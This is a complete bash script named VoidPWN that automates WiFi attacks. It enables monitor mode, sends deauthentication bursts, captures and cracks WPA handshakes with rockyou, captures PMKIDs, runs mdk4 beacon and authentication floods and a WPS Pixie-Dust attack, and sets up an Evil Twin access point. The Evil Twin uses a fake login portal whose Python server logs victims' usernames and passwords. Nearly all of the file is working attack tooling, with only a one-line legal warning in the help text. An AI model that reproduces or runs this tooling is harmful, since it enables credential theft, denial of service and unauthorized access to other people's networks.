#!/bin/bash

################################################################################
# VoidPWN - WiFi Attack Automation Script
# Description: Automated WiFi reconnaissance and attack tools
# Usage: ./wifi_tools.sh [options]
################################################################################

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m'

# Configuration
SCRIPT_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
PROJECT_ROOT="$(dirname "$(dirname "$SCRIPT_DIR")")"
OUTPUT_DIR="$PROJECT_ROOT/output/captures"

# Find a usable wordlist — auto-decompress rockyou if needed
find_wordlist() {
    local rockyou="/usr/share/wordlists/rockyou.txt"
    local rockyou_gz="/usr/share/wordlists/rockyou.txt.gz"

    if [[ -f "$rockyou" ]]; then
        echo "$rockyou"
        return 0
    fi
    if [[ -f "$rockyou_gz" ]]; then
        log_warning "Decompressing rockyou.txt.gz..."
        gunzip -k "$rockyou_gz" && echo "$rockyou" && return 0
    fi
    # Search for any common wordlist
    local found
    found=$(find /usr/share/wordlists -name "*.txt" 2>/dev/null | head -n 1)
    if [[ -n "$found" ]]; then
        log_warning "rockyou.txt not found, using fallback: $found"
        echo "$found"
        return 0
    fi
    log_error "No wordlist found. Install wordlists: sudo apt install wordlists"
    return 1
}

WORDLIST=$(find_wordlist 2>/dev/null || echo "")

# Auto-detect wireless interface using iw (handles wlan*, wlp*, wlx* naming)
detect_interface() {
    # Prefer external adapters (not the first one, which is usually built-in)
    # Use iw dev which works regardless of interface naming convention
    local ifaces
    ifaces=$(iw dev 2>/dev/null | awk '/Interface/{print $2}')

    if [[ -z "$ifaces" ]]; then
        # Fallback to ip link for any wireless
        ifaces=$(ip link show 2>/dev/null | awk -F': ' '/^[0-9]+: wl/{print $2}')
    fi

    if [[ -z "$ifaces" ]]; then
        echo ""
        return 1
    fi

    # Prefer wlan1/external adapters (more likely to be the pentest adapter)
    local preferred
    preferred=$(echo "$ifaces" | grep -v '^wlan0$' | head -n 1)
    if [[ -n "$preferred" ]]; then
        echo "$preferred"
    else
        echo "$ifaces" | head -n 1
    fi
}

INTERFACE=$(detect_interface)
if [[ -z "$INTERFACE" ]]; then
    echo -e "${RED}[!] No wireless interface detected!${NC}"
    exit 1
fi

# Set monitor interface name (airmon-ng usually appends 'mon' or changes it)
MONITOR_INTERFACE="${INTERFACE}mon"
if [[ "$INTERFACE" == *"mon"* ]]; then
    MONITOR_INTERFACE="$INTERFACE"
fi

# Create output directory
mkdir -p "$OUTPUT_DIR"

# Banner
print_banner() {
    echo -e "${CYAN}"
    cat << "EOF"
    ╦ ╦┬┌─┐┬  ┌┬┐┌─┐┌─┐┬  ┌─┐
    ║║║│├┤ │   │ │ ││ ││  └─┐
    ╚╩╝┴└  ┴   ┴ └─┘└─┘┴─┘└─┘
EOF
    echo -e "${NC}"
}

log_info() { echo -e "${BLUE}[*]${NC} $1"; }
log_success() { echo -e "${GREEN}[✓]${NC} $1"; }
log_warning() { echo -e "${YELLOW}[!]${NC} $1"; }
log_error() { echo -e "${RED}[✗]${NC} $1"; }

# Check if running as root
check_root() {
    if [[ $EUID -ne 0 ]]; then
        log_error "This script must be run as root (use sudo)"
        exit 1
    fi
}

# Kill interfering processes
kill_processes() {
    log_info "Killing interfering processes..."
    airmon-ng check kill > /dev/null 2>&1
    log_success "Processes killed"
}

# Enable monitor mode and return the resulting monitor interface name
enable_monitor_mode() {
    log_info "Enabling monitor mode on $INTERFACE..."

    # Check if interface exists
    if ! iw dev 2>/dev/null | grep -q "$INTERFACE"; then
        log_error "Interface $INTERFACE not found!"
        log_info "Available interfaces:"
        iw dev 2>/dev/null | awk '/Interface/{print "  " $2}'
        exit 1
    fi

    # Check if already in monitor mode
    if iw dev 2>/dev/null | awk "/Interface $INTERFACE/{f=1} f && /type/{print; f=0}" | grep -q monitor; then
        log_success "Interface $INTERFACE is already in monitor mode"
        MONITOR_INTERFACE="$INTERFACE"
        return
    fi

    # Kill interfering processes first
    airmon-ng check kill > /dev/null 2>&1 || true

    # Enable monitor mode via airmon-ng and parse resulting interface name
    local airmon_out
    airmon_out=$(airmon-ng start "$INTERFACE" 2>&1)
    log_info "airmon-ng output: $airmon_out"

    # Detect the resulting monitor interface from airmon-ng output
    local mon_iface
    mon_iface=$(echo "$airmon_out" | grep -oP '(?<=monitor mode vif enabled for|monitor mode enabled on|enabled on )\S+' | tail -1)

    # Fallback: scan iw dev for any interface now in monitor mode
    if [[ -z "$mon_iface" ]]; then
        mon_iface=$(iw dev 2>/dev/null | awk 'BEGIN{iface=""} /Interface/{iface=$2} /type monitor/{print iface; exit}')
    fi

    if [[ -n "$mon_iface" ]]; then
        MONITOR_INTERFACE="$mon_iface"
        log_success "Monitor mode enabled on $MONITOR_INTERFACE"
    else
        # Brute-force fallback
        log_info "Attempting fallback method..."
        ip link set "$INTERFACE" down
        iw "$INTERFACE" set type monitor
        ip link set "$INTERFACE" up
        MONITOR_INTERFACE="$INTERFACE"
        if iw dev 2>/dev/null | awk "/Interface $INTERFACE/{f=1} f && /type/{print; f=0}" | grep -q monitor; then
            log_success "Monitor mode enabled via fallback on $MONITOR_INTERFACE"
        else
            log_error "Failed to enable monitor mode on $INTERFACE"
            exit 1
        fi
    fi
}

# Disable monitor mode
disable_monitor_mode() {
    log_info "Disabling monitor mode..."
    airmon-ng stop "$MONITOR_INTERFACE" > /dev/null 2>&1 || true
    # Restore managed mode manually (RPi uses dhcpcd + wpa_supplicant, not NetworkManager)
    ip link set "$MONITOR_INTERFACE" down 2>/dev/null || true
    iw "$MONITOR_INTERFACE" set type managed 2>/dev/null || true
    ip link set "$INTERFACE" up 2>/dev/null || true
    # Restart dhcpcd if available (Raspberry Pi default), otherwise try NetworkManager
    if systemctl is-active --quiet dhcpcd 2>/dev/null || systemctl list-units --all | grep -q dhcpcd; then
        systemctl restart dhcpcd 2>/dev/null || true
    elif systemctl is-active --quiet NetworkManager 2>/dev/null; then
        systemctl restart NetworkManager 2>/dev/null || true
    fi
    log_success "Monitor mode disabled"
}

# Scan for networks (Headless for dashboard)
scan_networks() {
    local duration="${1:-15}"
    local output_file="${2:-$OUTPUT_DIR/scan_results}"

    if ! command -v airodump-ng &>/dev/null; then
        log_error "airodump-ng not found. Install with: sudo apt install aircrack-ng"
        exit 1
    fi

    enable_monitor_mode
    
    log_info "Scanning for WiFi networks for ${duration}s..."
    log_warning "Results will be saved to ${output_file}.csv"
    
    # Run airodump-ng for a limited time and exit
    sudo timeout "$duration" airodump-ng "$MONITOR_INTERFACE" -w "$output_file" --output-format csv
}

# Capture handshake
capture_handshake() {
    local bssid="$1"
    local channel="$2"
    local essid="$3"

    if [[ -z "$bssid" ]] || [[ -z "$channel" ]]; then
        log_error "Usage: $0 --handshake <BSSID> <CHANNEL> [ESSID]"
        exit 1
    fi

    if ! command -v airodump-ng &>/dev/null; then
        log_error "airodump-ng not found. Install with: sudo apt install aircrack-ng"
        exit 1
    fi
    if ! command -v aireplay-ng &>/dev/null; then
        log_error "aireplay-ng not found. Install with: sudo apt install aircrack-ng"
        exit 1
    fi

    enable_monitor_mode
    
    local output_file="$OUTPUT_DIR/handshake_$(date +%Y%m%d_%H%M%S)"
    
    log_info "Switching $MONITOR_INTERFACE to channel $channel..."
    iw dev "$MONITOR_INTERFACE" set channel "$channel" 2>/dev/null || iwconfig "$MONITOR_INTERFACE" channel "$channel" 2>/dev/null || true
    sleep 1

    log_info "Capturing handshake for $bssid on channel $channel"
    log_info "Output: $output_file"
    echo ""
    
    # Start capture in background
    airodump-ng -c "$channel" --bssid "$bssid" -w "$output_file" "$MONITOR_INTERFACE" &
    local airodump_pid=$!
    
    # Wait for airodump to stabilise before sending deauths
    sleep 5
    
    # Send deauth bursts to force clients to re-authenticate
    log_info "Sending deauth burst 1..."
    aireplay-ng --deauth 20 -a "$bssid" --ignore-negative-one "$MONITOR_INTERFACE"
    sleep 3
    log_info "Sending deauth burst 2..."
    aireplay-ng --deauth 20 -a "$bssid" --ignore-negative-one "$MONITOR_INTERFACE"
    sleep 3
    log_info "Sending deauth burst 3..."
    aireplay-ng --deauth 20 -a "$bssid" --ignore-negative-one "$MONITOR_INTERFACE"

    # Keep capturing for remaining window to catch the re-association handshake
    log_info "Waiting for handshake..."
    sleep 15
    kill $airodump_pid 2>/dev/null
    wait $airodump_pid 2>/dev/null

    # Verify a handshake was actually captured
    local cap_file="${output_file}-01.cap"
    if [[ -f "$cap_file" ]] && aircrack-ng "$cap_file" 2>/dev/null | grep -q "1 handshake"; then
        log_success "Handshake captured: $cap_file"
    else
        log_warning "Handshake may not have been captured — check: $cap_file"
        log_info "Try moving closer to the AP or ensuring a client is associated."
    fi
    log_info "Crack with: aircrack-ng -w <wordlist> $cap_file"
}

# Automated attack with Wifite
auto_attack() {
    if ! command -v wifite &>/dev/null; then
        log_error "wifite not found. Install with: sudo apt install wifite"
        exit 1
    fi

    enable_monitor_mode
    
    log_info "Starting automated WiFi attack with Wifite..."
    log_warning "This will target all nearby networks"
    echo ""

    if ! iw dev 2>/dev/null | awk "/Interface $MONITOR_INTERFACE/{f=1} f && /type/{print; f=0}" | grep -q monitor; then
        log_error "Interface $MONITOR_INTERFACE is not in monitor mode. Run --monitor-on first."
        exit 1
    fi

    if [[ -z "$WORDLIST" ]]; then
        log_warning "No wordlist available. Running wifite without dictionary..."
        wifite --kill --wpa --no-wps -i "$MONITOR_INTERFACE"
    else
        wifite --kill \
               --dict "$WORDLIST" \
               --wpa \
               --no-wps \
               -i "$MONITOR_INTERFACE"
    fi
}

# Deauth attack
deauth_attack() {
    local bssid="$1"
    local count="${2:-0}"  # 0 = continuous
    local channel="$3"

    if [[ -z "$bssid" ]]; then
        log_error "Usage: $0 --deauth <BSSID> [COUNT] [CHANNEL]"
        exit 1
    fi

    if ! command -v aireplay-ng &>/dev/null; then
        log_error "aireplay-ng not found. Install with: sudo apt install aircrack-ng"
        exit 1
    fi

    enable_monitor_mode
    
    if [[ -n "$channel" ]]; then
        log_info "Switching $MONITOR_INTERFACE to channel $channel..."
        iw dev "$MONITOR_INTERFACE" set channel "$channel" 2>/dev/null || iwconfig "$MONITOR_INTERFACE" channel "$channel" 2>/dev/null || true
        sleep 1
    fi
    
    log_info "Sending deauth packets to $bssid"
    if [[ "$count" -eq 0 ]]; then
        log_warning "Continuous mode - Press Ctrl+C to stop"
    fi
    echo ""
    
    # --ignore-negative-one fixes channel -1 issue
    aireplay-ng --deauth "$count" -a "$bssid" --ignore-negative-one "$MONITOR_INTERFACE"
}

# Evil Twin attack
evil_twin() {
    local ssid="$1"
    local channel="${2:-6}"

    if [[ -z "$ssid" ]]; then
        log_error "Usage: $0 --evil-twin <SSID> [CHANNEL]"
        exit 1
    fi

    # Verify required tools are installed
    for tool in hostapd dnsmasq iptables python3; do
        if ! command -v "$tool" &>/dev/null; then
            log_error "$tool is not installed. Run: sudo apt install $tool"
            exit 1
        fi
    done

    log_info "Setting up Evil Twin AP: '$ssid' on channel $channel"

    # Determine AP interface (use managed-mode interface, not monitor)
    local ap_iface="${INTERFACE:-wlan0}"
    [[ -z "$ap_iface" ]] && ap_iface=$(iw dev 2>/dev/null | awk '/Interface/{print $2}' | head -n 1)
    if [[ -z "$ap_iface" ]]; then
        log_error "No wireless interface found. Specify one with --interface."
        exit 1
    fi

    # Ensure interface is in managed mode (not monitor)
    ip link set "$ap_iface" down 2>/dev/null
    iw "$ap_iface" set type managed 2>/dev/null || true
    ip link set "$ap_iface" up 2>/dev/null

    local AP_IP="10.0.0.1"
    local AP_SUBNET="10.0.0.0/24"
    local DHCP_START="10.0.0.10"
    local DHCP_END="10.0.0.100"
    local PORTAL_PORT="8080"
    local TIMESTAMP
    TIMESTAMP=$(date +%Y%m%d_%H%M%S)
    local LOG_FILE="$OUTPUT_DIR/eviltwin_${TIMESTAMP}.txt"

    # Assign static IP to AP interface
    ip addr flush dev "$ap_iface" 2>/dev/null
    ip addr add "${AP_IP}/24" dev "$ap_iface"

    # Write hostapd config
    local HOSTAPD_CONF="/tmp/hostapd_voidpwn_${TIMESTAMP}.conf"
    cat > "$HOSTAPD_CONF" << HAPDEOF
interface=$ap_iface
driver=nl80211
ssid=$ssid
hw_mode=g
channel=$channel
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
HAPDEOF

    # Write dnsmasq config — DHCP + wildcard DNS redirect to portal
    local DNSMASQ_CONF="/tmp/dnsmasq_voidpwn_${TIMESTAMP}.conf"
    cat > "$DNSMASQ_CONF" << DMEOF
interface=$ap_iface
dhcp-range=$DHCP_START,$DHCP_END,255.255.255.0,12h
dhcp-option=3,$AP_IP
dhcp-option=6,$AP_IP
address=/#/$AP_IP
no-resolv
log-queries
DMEOF

    # Redirect all HTTP traffic to captive portal
    iptables -t nat -A PREROUTING -i "$ap_iface" -p tcp --dport 80 \
        -j DNAT --to-destination "${AP_IP}:${PORTAL_PORT}" 2>/dev/null
    iptables -t nat -A POSTROUTING -o "$ap_iface" -j MASQUERADE 2>/dev/null

    # Write minimal captive portal page
    local PORTAL_DIR="/tmp/voidpwn_portal_${TIMESTAMP}"
    mkdir -p "$PORTAL_DIR"
    cat > "$PORTAL_DIR/index.html" << HTMLEOF
<!DOCTYPE html><html><head><meta charset="utf-8">
<title>WiFi Login</title>
<style>body{font-family:sans-serif;background:#1a1a2e;color:#eee;display:flex;align-items:center;justify-content:center;height:100vh;margin:0}
.box{background:#16213e;padding:40px;border-radius:8px;max-width:350px;width:100%;text-align:center}
h2{color:#0f3460;margin-bottom:20px}input{width:100%;padding:10px;margin:8px 0;border:1px solid #333;background:#0f3460;color:#eee;border-radius:4px;box-sizing:border-box}
button{width:100%;padding:12px;background:#e94560;border:none;color:#fff;border-radius:4px;cursor:pointer;font-size:16px}</style>
</head><body><div class="box">
<h2>&#x1F4F6; Network Login</h2>
<p>Enter your credentials to connect.</p>
<form method="POST" action="/login">
<input type="text" name="username" placeholder="Username" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Connect</button>
</form></div></body></html>
HTMLEOF

    # Minimal Python HTTP server to capture credentials
    local PORTAL_PY="/tmp/voidpwn_portal_${TIMESTAMP}.py"
    cat > "$PORTAL_PY" << PYEOF
import http.server, urllib.parse, os, datetime

LOG = "${LOG_FILE}"
PORT = ${PORTAL_PORT}
DIR  = "${PORTAL_DIR}"

class Handler(http.server.BaseHTTPRequestHandler):
    def log_message(self, fmt, *args): pass
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type","text/html")
        self.end_headers()
        with open(os.path.join(DIR,"index.html"),"rb") as f:
            self.wfile.write(f.read())
    def do_POST(self):
        length = int(self.headers.get("Content-Length",0))
        body   = self.rfile.read(length).decode("utf-8","ignore")
        params = urllib.parse.parse_qs(body)
        ts     = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        user   = params.get("username",[""])[0]
        pwd    = params.get("password",[""])[0]
        entry  = f"[{ts}] CAPTURED — user='{user}' pass='{pwd}' src={self.client_address[0]}\n"
        with open(LOG,"a") as lf:
            lf.write(entry)
        print(entry, end="", flush=True)
        # Redirect back to portal
        self.send_response(302)
        self.send_header("Location","/")
        self.end_headers()

http.server.HTTPServer(("0.0.0.0", PORT), Handler).serve_forever()
PYEOF

    # Cleanup function
    cleanup_evil_twin() {
        log_warning "Stopping Evil Twin AP and cleaning up..."
        kill "$HOSTAPD_PID" 2>/dev/null
        kill "$DNSMASQ_PID" 2>/dev/null
        kill "$PORTAL_PID"  2>/dev/null
        iptables -t nat -D PREROUTING -i "$ap_iface" -p tcp --dport 80 \
            -j DNAT --to-destination "${AP_IP}:${PORTAL_PORT}" 2>/dev/null
        iptables -t nat -D POSTROUTING -o "$ap_iface" -j MASQUERADE 2>/dev/null
        ip addr flush dev "$ap_iface" 2>/dev/null
        rm -f "$HOSTAPD_CONF" "$DNSMASQ_CONF" "$PORTAL_PY"
        rm -rf "$PORTAL_DIR"
        log_success "Evil Twin AP stopped. Credentials log: $LOG_FILE"
    }
    trap cleanup_evil_twin INT TERM

    # Start services
    log_info "Starting hostapd (AP broadcast)..."
    hostapd "$HOSTAPD_CONF" >> "$LOG_FILE" 2>&1 &
    HOSTAPD_PID=$!
    sleep 2

    if ! kill -0 "$HOSTAPD_PID" 2>/dev/null; then
        log_error "hostapd failed to start. Check that $ap_iface supports AP mode."
        log_error "Details: $LOG_FILE"
        # Clean up iptables rules that were set before hostapd was launched
        iptables -t nat -D PREROUTING -i "$ap_iface" -p tcp --dport 80 \
            -j DNAT --to-destination "${AP_IP}:${PORTAL_PORT}" 2>/dev/null
        iptables -t nat -D POSTROUTING -o "$ap_iface" -j MASQUERADE 2>/dev/null
        ip addr flush dev "$ap_iface" 2>/dev/null
        rm -f "$HOSTAPD_CONF" "$DNSMASQ_CONF"
        exit 1
    fi

    log_info "Starting dnsmasq (DHCP + DNS)..."
    dnsmasq -C "$DNSMASQ_CONF" --pid-file=/tmp/dnsmasq_voidpwn.pid >> "$LOG_FILE" 2>&1 &
    DNSMASQ_PID=$!
    sleep 2

    if ! kill -0 "$DNSMASQ_PID" 2>/dev/null; then
        log_error "dnsmasq failed to start. Check config: $DNSMASQ_CONF"
        cleanup_evil_twin
        exit 1
    fi

    log_info "Starting captive portal on port $PORTAL_PORT..."
    python3 "$PORTAL_PY" >> "$LOG_FILE" 2>&1 &
    PORTAL_PID=$!
    sleep 1

    log_success "Evil Twin AP running: SSID='$ssid' on channel $channel (iface: $ap_iface)"
    log_info   "Captive portal active at http://$AP_IP:$PORTAL_PORT"
    log_info   "Credentials will be logged to: $LOG_FILE"
    log_warning "Press Ctrl+C to stop"

    # Wait for hostapd to exit or Ctrl+C
    wait "$HOSTAPD_PID"
}

# Crack captured handshake
crack_handshake() {
    local cap_file="$1"
    local wordlist="${2:-$WORDLIST}"

    if [[ -z "$cap_file" ]]; then
        log_error "Usage: $0 --crack <CAP_FILE> [WORDLIST]"
        exit 1
    fi

    if [[ ! -f "$cap_file" ]]; then
        log_error "File not found: $cap_file"
        exit 1
    fi

    if ! command -v aircrack-ng &>/dev/null; then
        log_error "aircrack-ng not found. Install with: sudo apt install aircrack-ng"
        exit 1
    fi

    if [[ -z "$wordlist" ]]; then
        wordlist=$(find_wordlist)
        if [[ $? -ne 0 ]]; then
            log_error "No wordlist available. Provide one with: $0 --crack <CAP_FILE> <WORDLIST>"
            exit 1
        fi
    fi
    
    log_info "Cracking handshake: $cap_file"
    log_info "Wordlist: $wordlist"
    echo ""
    
    aircrack-ng -w "$wordlist" "$cap_file"
}

# PMKID Attack (Clientless)
pmkid_capture() {
    local interface="$1"
    local duration="${2:-300}" # Default 5 mins

    if ! command -v hcxdumptool &>/dev/null; then
        log_error "hcxdumptool not found. Install with: sudo apt install hcxdumptool"
        exit 1
    fi
    if ! command -v hcxpcapngtool &>/dev/null; then
        log_warning "hcxpcapngtool not found (install hcxtools for hash conversion). Capture will still run."
    fi

    enable_monitor_mode
    [[ -z "$interface" ]] && interface="$MONITOR_INTERFACE"
    
    log_info "Starting PMKID capture on $interface for $duration seconds..."
    log_warning "No clients needed for this attack!"
    
    local output_pcapng="$OUTPUT_DIR/pmkid_$(date +%Y%m%d_%H%M%S).pcapng"
    
    # hcxdumptool for PMKID capture
    # -o: output file
    # -i: interface
    # --enable_status=1: show status
    timeout "$duration" hcxdumptool -o "$output_pcapng" -i "$interface" --enable_status=1
    
    if [[ -f "$output_pcapng" ]]; then
        log_success "Capture complete: $output_pcapng"
        if command -v hcxpcapngtool &>/dev/null; then
            local hash_file="${output_pcapng%.pcapng}.hc22000"
            hcxpcapngtool -o "$hash_file" "$output_pcapng" 2>/dev/null
            if [[ -s "$hash_file" ]]; then
                log_success "Hash file ready: $hash_file"
                log_info "Crack with: hashcat -m 22000 \"$hash_file\" <wordlist>"
            else
                log_warning "Conversion produced empty hash — no PMKID/EAPOL captured. Try again near an active AP."
                rm -f "$hash_file"
            fi
        else
            log_info "Convert manually: hcxpcapngtool -o hash.hc22000 \"$output_pcapng\""
        fi
    else
        log_error "Capture failed or no data collected"
    fi
}

# MDK4 Beacon Flooding
mdk4_beacon_flood() {
    local interface="$1"
    local ssid_file="$2"

    if ! command -v mdk4 &>/dev/null; then
        log_error "mdk4 not found. Install with: sudo apt install mdk4"
        exit 1
    fi

    enable_monitor_mode
    [[ -z "$interface" ]] && interface="$MONITOR_INTERFACE"
    
    log_info "Starting MDK4 Beacon Flood on $interface..."
    if [[ -n "$ssid_file" ]]; then
        log_info "Using SSIDs from: $ssid_file"
        mdk4 "$interface" b -f "$ssid_file"
    else
        log_info "Generating random SSIDs..."
        mdk4 "$interface" b
    fi
}

# MDK4 Auth Flooding
mdk4_auth_flood() {
    local interface="$1"
    local bssid="$2"

    if ! command -v mdk4 &>/dev/null; then
        log_error "mdk4 not found. Install with: sudo apt install mdk4"
        exit 1
    fi

    enable_monitor_mode
    [[ -z "$interface" ]] && interface="$MONITOR_INTERFACE"
    
    if [[ -n "$bssid" ]]; then
        log_info "Starting MDK4 Auth Flood against $bssid on $interface..."
        mdk4 "$interface" a -a "$bssid"
    else
        log_info "Starting MDK4 Auth Flood against ALL APs on $interface..."
        mdk4 "$interface" a
    fi
}

# WPS Pixie-Dust Attack
wps_pixie_dust() {
    local bssid="$1"
    local interface="$2"

    if [[ -z "$bssid" ]]; then
        log_error "Usage: $0 --pixie <BSSID> [INTERFACE]"
        exit 1
    fi

    if ! command -v reaver &>/dev/null; then
        log_error "reaver not found. Install with: sudo apt install reaver"
        exit 1
    fi

    [[ -z "$interface" ]] && interface="$MONITOR_INTERFACE"
    
    log_info "Starting WPS Pixie-Dust attack against $bssid..."
    log_warning "Timeout: 5 minutes. Press Ctrl+C to abort early."
    # -i: interface, -b: bssid, -K: pixie-dust, -vv: verbose
    timeout 300 reaver -i "$interface" -b "$bssid" -K 1 -vv
    local exit_code=$?
    if [[ $exit_code -eq 124 ]]; then
        log_warning "Pixie-Dust attack timed out after 5 minutes (WPS may not be vulnerable)"
    fi
}

# Show help
show_help() {
    cat << EOF
${CYAN}VoidPWN WiFi Tools${NC}

${YELLOW}Usage:${NC}
  sudo $0 [OPTION]

${YELLOW}Options:${NC}
  --scan                    Scan for WiFi networks
  --handshake <BSSID> <CH>  Capture WPA handshake
  --auto-attack             Automated attack with Wifite
  --deauth <BSSID> [COUNT]  Deauth attack (0=continuous)
  --evil-twin <SSID> [CH]   Create Evil Twin AP (uses wifiphisher/fluxion if available)
  --crack <FILE> [DICT]     Crack captured handshake
  --pmkid [DUR]             Capture PMKID (clientless, default 300s)
  --beacon [FILE]           MDK4 Beacon Flood (optional SSID list)
  --auth [BSSID]            MDK4 Auth Flood (optional target BSSID)
  --pixie <BSSID>           WPS Pixie-Dust attack
  --monitor-on              Enable monitor mode
  --monitor-off             Disable monitor mode
  --help                    Show this help

${YELLOW}Examples:${NC}
  sudo $0 --scan
  sudo $0 --handshake AA:BB:CC:DD:EE:FF 6
  sudo $0 --auto-attack
  sudo $0 --deauth AA:BB:CC:DD:EE:FF 10
  sudo $0 --evil-twin "Free WiFi" 6
  sudo $0 --crack ~/captures/handshake-01.cap

${YELLOW}Output Directory:${NC}
  $OUTPUT_DIR

${RED}Legal Warning:${NC}
  Only test networks you own or have explicit permission to test.
  Unauthorized access is illegal.

EOF
}

# Main
main() {
    print_banner
    check_root
    
    case "$1" in
        --scan)
            scan_networks "$2" "$3"
            ;;
        --handshake)
            capture_handshake "$2" "$3" "$4"
            ;;
        --auto-attack)
            auto_attack
            ;;
        --deauth)
            deauth_attack "$2" "$3"
            ;;
        --evil-twin)
            evil_twin "$2" "$3"
            ;;
        --crack)
            crack_handshake "$2" "$3"
            ;;
        --pmkid)
            pmkid_capture "$MONITOR_INTERFACE" "$2"
            ;;
        --beacon)
            mdk4_beacon_flood "$MONITOR_INTERFACE" "$2"
            ;;
        --auth)
            mdk4_auth_flood "$MONITOR_INTERFACE" "$2"
            ;;
        --pixie)
            wps_pixie_dust "$2" "$MONITOR_INTERFACE"
            ;;
        --monitor-on)
            enable_monitor_mode
            ;;
        --monitor-off)
            disable_monitor_mode
            ;;
        --help|*)
            show_help
            ;;
    esac
}

# Cleanup on exit
trap 'log_warning "Interrupted"; disable_monitor_mode; exit 1' INT TERM

main "$@"
